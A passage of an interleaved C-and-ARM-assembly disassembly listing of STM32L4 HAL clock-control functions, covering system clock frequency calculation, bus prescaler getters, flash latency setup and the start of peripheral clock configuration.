 80041d4:	00db      	lsls	r3, r3, #3
 80041d6:	4910      	ldr	r1, [pc, #64]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80041d8:	4313      	orrs	r3, r2
 80041da:	608b      	str	r3, [r1, #8]
  }

  /* Update the SystemCoreClock global variable */
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80041dc:	f000 f824 	bl	8004228 <HAL_RCC_GetSysClockFreq>
 80041e0:	4602      	mov	r2, r0
 80041e2:	4b0d      	ldr	r3, [pc, #52]	; (8004218 <HAL_RCC_ClockConfig+0x1f0>)
 80041e4:	689b      	ldr	r3, [r3, #8]
 80041e6:	091b      	lsrs	r3, r3, #4
 80041e8:	f003 030f 	and.w	r3, r3, #15
 80041ec:	490b      	ldr	r1, [pc, #44]	; (800421c <HAL_RCC_ClockConfig+0x1f4>)
 80041ee:	5ccb      	ldrb	r3, [r1, r3]
 80041f0:	f003 031f 	and.w	r3, r3, #31
 80041f4:	fa22 f303 	lsr.w	r3, r2, r3
 80041f8:	4a09      	ldr	r2, [pc, #36]	; (8004220 <HAL_RCC_ClockConfig+0x1f8>)
 80041fa:	6013      	str	r3, [r2, #0]

  /* Configure the source of time base considering new system clocks settings*/
  status = HAL_InitTick(uwTickPrio);
 80041fc:	4b09      	ldr	r3, [pc, #36]	; (8004224 <HAL_RCC_ClockConfig+0x1fc>)
 80041fe:	681b      	ldr	r3, [r3, #0]
 8004200:	4618      	mov	r0, r3
 8004202:	f7fc ff29 	bl	8001058 <HAL_InitTick>
 8004206:	4603      	mov	r3, r0
 8004208:	72fb      	strb	r3, [r7, #11]

  return status;
 800420a:	7afb      	ldrb	r3, [r7, #11]
}
 800420c:	4618      	mov	r0, r3
 800420e:	3710      	adds	r7, #16
 8004210:	46bd      	mov	sp, r7
 8004212:	bd80      	pop	{r7, pc}
 8004214:	40022000 	.word	0x40022000
 8004218:	40021000 	.word	0x40021000
 800421c:	0800d0c8 	.word	0x0800d0c8
 8004220:	20000000 	.word	0x20000000
 8004224:	20000004 	.word	0x20000004

08004228 <HAL_RCC_GetSysClockFreq>:
  *
  *
  * @retval SYSCLK frequency
  */
uint32_t HAL_RCC_GetSysClockFreq(void)
{
 8004228:	b480      	push	{r7}
 800422a:	b089      	sub	sp, #36	; 0x24
 800422c:	af00      	add	r7, sp, #0
  uint32_t msirange = 0U, sysclockfreq = 0U;
 800422e:	2300      	movs	r3, #0
 8004230:	61fb      	str	r3, [r7, #28]
 8004232:	2300      	movs	r3, #0
 8004234:	61bb      	str	r3, [r7, #24]
  uint32_t pllvco, pllsource, pllr, pllm;    /* no init needed */
  uint32_t sysclk_source, pll_oscsource;

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8004236:	4b3e      	ldr	r3, [pc, #248]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 8004238:	689b      	ldr	r3, [r3, #8]
 800423a:	f003 030c 	and.w	r3, r3, #12
 800423e:	613b      	str	r3, [r7, #16]
  pll_oscsource = __HAL_RCC_GET_PLL_OSCSOURCE();
 8004240:	4b3b      	ldr	r3, [pc, #236]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 8004242:	68db      	ldr	r3, [r3, #12]
 8004244:	f003 0303 	and.w	r3, r3, #3
 8004248:	60fb      	str	r3, [r7, #12]

  if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 800424a:	693b      	ldr	r3, [r7, #16]
 800424c:	2b00      	cmp	r3, #0
 800424e:	d005      	beq.n	800425c <HAL_RCC_GetSysClockFreq+0x34>
 8004250:	693b      	ldr	r3, [r7, #16]
 8004252:	2b0c      	cmp	r3, #12
 8004254:	d121      	bne.n	800429a <HAL_RCC_GetSysClockFreq+0x72>
     ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_oscsource == RCC_PLLSOURCE_MSI)))
 8004256:	68fb      	ldr	r3, [r7, #12]
 8004258:	2b01      	cmp	r3, #1
 800425a:	d11e      	bne.n	800429a <HAL_RCC_GetSysClockFreq+0x72>
  {
    /* MSI or PLL with MSI source used as system clock source */

    /* Get SYSCLK source */
    if(READ_BIT(RCC->CR, RCC_CR_MSIRGSEL) == 0U)
 800425c:	4b34      	ldr	r3, [pc, #208]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 800425e:	681b      	ldr	r3, [r3, #0]
 8004260:	f003 0308 	and.w	r3, r3, #8
 8004264:	2b00      	cmp	r3, #0
 8004266:	d107      	bne.n	8004278 <HAL_RCC_GetSysClockFreq+0x50>
    { /* MSISRANGE from RCC_CSR applies */
      msirange = READ_BIT(RCC->CSR, RCC_CSR_MSISRANGE) >> RCC_CSR_MSISRANGE_Pos;
 8004268:	4b31      	ldr	r3, [pc, #196]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 800426a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 800426e:	0a1b      	lsrs	r3, r3, #8
 8004270:	f003 030f 	and.w	r3, r3, #15
 8004274:	61fb      	str	r3, [r7, #28]
 8004276:	e005      	b.n	8004284 <HAL_RCC_GetSysClockFreq+0x5c>
    }
    else
    { /* MSIRANGE from RCC_CR applies */
      msirange = READ_BIT(RCC->CR, RCC_CR_MSIRANGE) >> RCC_CR_MSIRANGE_Pos;
 8004278:	4b2d      	ldr	r3, [pc, #180]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 800427a:	681b      	ldr	r3, [r3, #0]
 800427c:	091b      	lsrs	r3, r3, #4
 800427e:	f003 030f 	and.w	r3, r3, #15
 8004282:	61fb      	str	r3, [r7, #28]
    }
    /*MSI frequency range in HZ*/
    msirange = MSIRangeTable[msirange];
 8004284:	4a2b      	ldr	r2, [pc, #172]	; (8004334 <HAL_RCC_GetSysClockFreq+0x10c>)
 8004286:	69fb      	ldr	r3, [r7, #28]
 8004288:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 800428c:	61fb      	str	r3, [r7, #28]

    if(sysclk_source == RCC_CFGR_SWS_MSI)
 800428e:	693b      	ldr	r3, [r7, #16]
 8004290:	2b00      	cmp	r3, #0
 8004292:	d10d      	bne.n	80042b0 <HAL_RCC_GetSysClockFreq+0x88>
    {
      /* MSI used as system clock source */
      sysclockfreq = msirange;
 8004294:	69fb      	ldr	r3, [r7, #28]
 8004296:	61bb      	str	r3, [r7, #24]
    if(sysclk_source == RCC_CFGR_SWS_MSI)
 8004298:	e00a      	b.n	80042b0 <HAL_RCC_GetSysClockFreq+0x88>
    }
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSI)
 800429a:	693b      	ldr	r3, [r7, #16]
 800429c:	2b04      	cmp	r3, #4
 800429e:	d102      	bne.n	80042a6 <HAL_RCC_GetSysClockFreq+0x7e>
  {
    /* HSI used as system clock source */
    sysclockfreq = HSI_VALUE;
 80042a0:	4b25      	ldr	r3, [pc, #148]	; (8004338 <HAL_RCC_GetSysClockFreq+0x110>)
 80042a2:	61bb      	str	r3, [r7, #24]
 80042a4:	e004      	b.n	80042b0 <HAL_RCC_GetSysClockFreq+0x88>
  }
  else if(sysclk_source == RCC_CFGR_SWS_HSE)
 80042a6:	693b      	ldr	r3, [r7, #16]
 80042a8:	2b08      	cmp	r3, #8
 80042aa:	d101      	bne.n	80042b0 <HAL_RCC_GetSysClockFreq+0x88>
  {
    /* HSE used as system clock source */
    sysclockfreq = HSE_VALUE;
 80042ac:	4b23      	ldr	r3, [pc, #140]	; (800433c <HAL_RCC_GetSysClockFreq+0x114>)
 80042ae:	61bb      	str	r3, [r7, #24]
  else
  {
    /* unexpected case: sysclockfreq at 0 */
  }

  if(sysclk_source == RCC_CFGR_SWS_PLL)
 80042b0:	693b      	ldr	r3, [r7, #16]
 80042b2:	2b0c      	cmp	r3, #12
 80042b4:	d134      	bne.n	8004320 <HAL_RCC_GetSysClockFreq+0xf8>
    /* PLL used as system clock  source */

    /* PLL_VCO = (HSE_VALUE or HSI_VALUE or MSI_VALUE) * PLLN / PLLM
    SYSCLK = PLL_VCO / PLLR
    */
    pllsource = READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC);
 80042b6:	4b1e      	ldr	r3, [pc, #120]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 80042b8:	68db      	ldr	r3, [r3, #12]
 80042ba:	f003 0303 	and.w	r3, r3, #3
 80042be:	60bb      	str	r3, [r7, #8]

    switch (pllsource)
 80042c0:	68bb      	ldr	r3, [r7, #8]
 80042c2:	2b02      	cmp	r3, #2
 80042c4:	d003      	beq.n	80042ce <HAL_RCC_GetSysClockFreq+0xa6>
 80042c6:	68bb      	ldr	r3, [r7, #8]
 80042c8:	2b03      	cmp	r3, #3
 80042ca:	d003      	beq.n	80042d4 <HAL_RCC_GetSysClockFreq+0xac>
 80042cc:	e005      	b.n	80042da <HAL_RCC_GetSysClockFreq+0xb2>
    {
    case RCC_PLLSOURCE_HSI:  /* HSI used as PLL clock source */
      pllvco = HSI_VALUE;
 80042ce:	4b1a      	ldr	r3, [pc, #104]	; (8004338 <HAL_RCC_GetSysClockFreq+0x110>)
 80042d0:	617b      	str	r3, [r7, #20]
      break;
 80042d2:	e005      	b.n	80042e0 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_HSE:  /* HSE used as PLL clock source */
      pllvco = HSE_VALUE;
 80042d4:	4b19      	ldr	r3, [pc, #100]	; (800433c <HAL_RCC_GetSysClockFreq+0x114>)
 80042d6:	617b      	str	r3, [r7, #20]
      break;
 80042d8:	e002      	b.n	80042e0 <HAL_RCC_GetSysClockFreq+0xb8>

    case RCC_PLLSOURCE_MSI:  /* MSI used as PLL clock source */
    default:
      pllvco = msirange;
 80042da:	69fb      	ldr	r3, [r7, #28]
 80042dc:	617b      	str	r3, [r7, #20]
      break;
 80042de:	bf00      	nop
    }
    pllm = (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U ;
 80042e0:	4b13      	ldr	r3, [pc, #76]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 80042e2:	68db      	ldr	r3, [r3, #12]
 80042e4:	091b      	lsrs	r3, r3, #4
 80042e6:	f003 0307 	and.w	r3, r3, #7
 80042ea:	3301      	adds	r3, #1
 80042ec:	607b      	str	r3, [r7, #4]
    pllvco = (pllvco * (READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLN) >> RCC_PLLCFGR_PLLN_Pos)) / pllm;
 80042ee:	4b10      	ldr	r3, [pc, #64]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 80042f0:	68db      	ldr	r3, [r3, #12]
 80042f2:	0a1b      	lsrs	r3, r3, #8
 80042f4:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 80042f8:	697a      	ldr	r2, [r7, #20]
 80042fa:	fb03 f202 	mul.w	r2, r3, r2
 80042fe:	687b      	ldr	r3, [r7, #4]
 8004300:	fbb2 f3f3 	udiv	r3, r2, r3
 8004304:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 8004306:	4b0a      	ldr	r3, [pc, #40]	; (8004330 <HAL_RCC_GetSysClockFreq+0x108>)
 8004308:	68db      	ldr	r3, [r3, #12]
 800430a:	0e5b      	lsrs	r3, r3, #25
 800430c:	f003 0303 	and.w	r3, r3, #3
 8004310:	3301      	adds	r3, #1
 8004312:	005b      	lsls	r3, r3, #1
 8004314:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 8004316:	697a      	ldr	r2, [r7, #20]
 8004318:	683b      	ldr	r3, [r7, #0]
 800431a:	fbb2 f3f3 	udiv	r3, r2, r3
 800431e:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 8004320:	69bb      	ldr	r3, [r7, #24]
}
 8004322:	4618      	mov	r0, r3
 8004324:	3724      	adds	r7, #36	; 0x24
 8004326:	46bd      	mov	sp, r7
 8004328:	f85d 7b04 	ldr.w	r7, [sp], #4
 800432c:	4770      	bx	lr
 800432e:	bf00      	nop
 8004330:	40021000 	.word	0x40021000
 8004334:	0800d0e0 	.word	0x0800d0e0
 8004338:	00f42400 	.word	0x00f42400
 800433c:	007a1200 	.word	0x007a1200

08004340 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 8004340:	b480      	push	{r7}
 8004342:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 8004344:	4b03      	ldr	r3, [pc, #12]	; (8004354 <HAL_RCC_GetHCLKFreq+0x14>)
 8004346:	681b      	ldr	r3, [r3, #0]
}
 8004348:	4618      	mov	r0, r3
 800434a:	46bd      	mov	sp, r7
 800434c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004350:	4770      	bx	lr
 8004352:	bf00      	nop
 8004354:	20000000 	.word	0x20000000

08004358 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004358:	b580      	push	{r7, lr}
 800435a:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 800435c:	f7ff fff0 	bl	8004340 <HAL_RCC_GetHCLKFreq>
 8004360:	4602      	mov	r2, r0
 8004362:	4b06      	ldr	r3, [pc, #24]	; (800437c <HAL_RCC_GetPCLK1Freq+0x24>)
 8004364:	689b      	ldr	r3, [r3, #8]
 8004366:	0a1b      	lsrs	r3, r3, #8
 8004368:	f003 0307 	and.w	r3, r3, #7
 800436c:	4904      	ldr	r1, [pc, #16]	; (8004380 <HAL_RCC_GetPCLK1Freq+0x28>)
 800436e:	5ccb      	ldrb	r3, [r1, r3]
 8004370:	f003 031f 	and.w	r3, r3, #31
 8004374:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004378:	4618      	mov	r0, r3
 800437a:	bd80      	pop	{r7, pc}
 800437c:	40021000 	.word	0x40021000
 8004380:	0800d0d8 	.word	0x0800d0d8

08004384 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 8004384:	b580      	push	{r7, lr}
 8004386:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004388:	f7ff ffda 	bl	8004340 <HAL_RCC_GetHCLKFreq>
 800438c:	4602      	mov	r2, r0
 800438e:	4b06      	ldr	r3, [pc, #24]	; (80043a8 <HAL_RCC_GetPCLK2Freq+0x24>)
 8004390:	689b      	ldr	r3, [r3, #8]
 8004392:	0adb      	lsrs	r3, r3, #11
 8004394:	f003 0307 	and.w	r3, r3, #7
 8004398:	4904      	ldr	r1, [pc, #16]	; (80043ac <HAL_RCC_GetPCLK2Freq+0x28>)
 800439a:	5ccb      	ldrb	r3, [r1, r3]
 800439c:	f003 031f 	and.w	r3, r3, #31
 80043a0:	fa22 f303 	lsr.w	r3, r2, r3
}
 80043a4:	4618      	mov	r0, r3
 80043a6:	bd80      	pop	{r7, pc}
 80043a8:	40021000 	.word	0x40021000
 80043ac:	0800d0d8 	.word	0x0800d0d8

080043b0 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 80043b0:	b580      	push	{r7, lr}
 80043b2:	b086      	sub	sp, #24
 80043b4:	af00      	add	r7, sp, #0
 80043b6:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 80043b8:	2300      	movs	r3, #0
 80043ba:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 80043bc:	4b2a      	ldr	r3, [pc, #168]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043be:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80043c0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80043c4:	2b00      	cmp	r3, #0
 80043c6:	d003      	beq.n	80043d0 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 80043c8:	f7ff f9a6 	bl	8003718 <HAL_PWREx_GetVoltageRange>
 80043cc:	6178      	str	r0, [r7, #20]
 80043ce:	e014      	b.n	80043fa <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 80043d0:	4b25      	ldr	r3, [pc, #148]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043d2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80043d4:	4a24      	ldr	r2, [pc, #144]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043d6:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80043da:	6593      	str	r3, [r2, #88]	; 0x58
 80043dc:	4b22      	ldr	r3, [pc, #136]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043de:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80043e0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80043e4:	60fb      	str	r3, [r7, #12]
 80043e6:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 80043e8:	f7ff f996 	bl	8003718 <HAL_PWREx_GetVoltageRange>
 80043ec:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 80043ee:	4b1e      	ldr	r3, [pc, #120]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043f0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80043f2:	4a1d      	ldr	r2, [pc, #116]	; (8004468 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80043f4:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80043f8:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 80043fa:	697b      	ldr	r3, [r7, #20]
 80043fc:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004400:	d10b      	bne.n	800441a <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004402:	687b      	ldr	r3, [r7, #4]
 8004404:	2b80      	cmp	r3, #128	; 0x80
 8004406:	d919      	bls.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004408:	687b      	ldr	r3, [r7, #4]
 800440a:	2ba0      	cmp	r3, #160	; 0xa0
 800440c:	d902      	bls.n	8004414 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800440e:	2302      	movs	r3, #2
 8004410:	613b      	str	r3, [r7, #16]
 8004412:	e013      	b.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004414:	2301      	movs	r3, #1
 8004416:	613b      	str	r3, [r7, #16]
 8004418:	e010      	b.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 800441a:	687b      	ldr	r3, [r7, #4]
 800441c:	2b80      	cmp	r3, #128	; 0x80
 800441e:	d902      	bls.n	8004426 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 8004420:	2303      	movs	r3, #3
 8004422:	613b      	str	r3, [r7, #16]
 8004424:	e00a      	b.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 8004426:	687b      	ldr	r3, [r7, #4]
 8004428:	2b80      	cmp	r3, #128	; 0x80
 800442a:	d102      	bne.n	8004432 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800442c:	2302      	movs	r3, #2
 800442e:	613b      	str	r3, [r7, #16]
 8004430:	e004      	b.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 8004432:	687b      	ldr	r3, [r7, #4]
 8004434:	2b70      	cmp	r3, #112	; 0x70
 8004436:	d101      	bne.n	800443c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004438:	2301      	movs	r3, #1
 800443a:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 800443c:	4b0b      	ldr	r3, [pc, #44]	; (800446c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800443e:	681b      	ldr	r3, [r3, #0]
 8004440:	f023 0207 	bic.w	r2, r3, #7
 8004444:	4909      	ldr	r1, [pc, #36]	; (800446c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004446:	693b      	ldr	r3, [r7, #16]
 8004448:	4313      	orrs	r3, r2
 800444a:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 800444c:	4b07      	ldr	r3, [pc, #28]	; (800446c <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800444e:	681b      	ldr	r3, [r3, #0]
 8004450:	f003 0307 	and.w	r3, r3, #7
 8004454:	693a      	ldr	r2, [r7, #16]
 8004456:	429a      	cmp	r2, r3
 8004458:	d001      	beq.n	800445e <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 800445a:	2301      	movs	r3, #1
 800445c:	e000      	b.n	8004460 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800445e:	2300      	movs	r3, #0
}
 8004460:	4618      	mov	r0, r3
 8004462:	3718      	adds	r7, #24
 8004464:	46bd      	mov	sp, r7
 8004466:	bd80      	pop	{r7, pc}
 8004468:	40021000 	.word	0x40021000
 800446c:	40022000 	.word	0x40022000

08004470 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 8004470:	b580      	push	{r7, lr}
 8004472:	b086      	sub	sp, #24
 8004474:	af00      	add	r7, sp, #0
 8004476:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004478:	2300      	movs	r3, #0
 800447a:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 800447c:	2300      	movs	r3, #0
 800447e:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004480:	687b      	ldr	r3, [r7, #4]
 8004482:	681b      	ldr	r3, [r3, #0]
 8004484:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004488:	2b00      	cmp	r3, #0
 800448a:	d031      	beq.n	80044f0 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 800448c:	687b      	ldr	r3, [r7, #4]
 800448e:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004490:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004494:	d01a      	beq.n	80044cc <HAL_RCCEx_PeriphCLKConfig+0x5c>
 8004496:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800449a:	d814      	bhi.n	80044c6 <HAL_RCCEx_PeriphCLKConfig+0x56>
 800449c:	2b00      	cmp	r3, #0
 800449e:	d009      	beq.n	80044b4 <HAL_RCCEx_PeriphCLKConfig+0x44>
 80044a0:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 80044a4:	d10f      	bne.n	80044c6 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 80044a6:	4b5d      	ldr	r3, [pc, #372]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80044a8:	68db      	ldr	r3, [r3, #12]
 80044aa:	4a5c      	ldr	r2, [pc, #368]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80044ac:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80044b0:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 80044b2:	e00c      	b.n	80044ce <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 80044b4:	687b      	ldr	r3, [r7, #4]
 80044b6:	3304      	adds	r3, #4
 80044b8:	2100      	movs	r1, #0
 80044ba:	4618      	mov	r0, r3
 80044bc:	f000 f9de 	bl	800487c <RCCEx_PLLSAI1_Config>
 80044c0:	4603      	mov	r3, r0
 80044c2:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 80044c4:	e003      	b.n	80044ce <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 80044c6:	2301      	movs	r3, #1
 80044c8:	74fb      	strb	r3, [r7, #19]
      break;
 80044ca:	e000      	b.n	80044ce <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 80044cc:	bf00      	nop
    }

    if(ret == HAL_OK)
 80044ce:	7cfb      	ldrb	r3, [r7, #19]
 80044d0:	2b00      	cmp	r3, #0
 80044d2:	d10b      	bne.n	80044ec <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 80044d4:	4b51      	ldr	r3, [pc, #324]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80044d6:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80044da:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 80044de:	687b      	ldr	r3, [r7, #4]
 80044e0:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80044e2:	494e      	ldr	r1, [pc, #312]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80044e4:	4313      	orrs	r3, r2
 80044e6:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 80044ea:	e001      	b.n	80044f0 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 80044ec:	7cfb      	ldrb	r3, [r7, #19]
 80044ee:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 80044f0:	687b      	ldr	r3, [r7, #4]
 80044f2:	681b      	ldr	r3, [r3, #0]
 80044f4:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
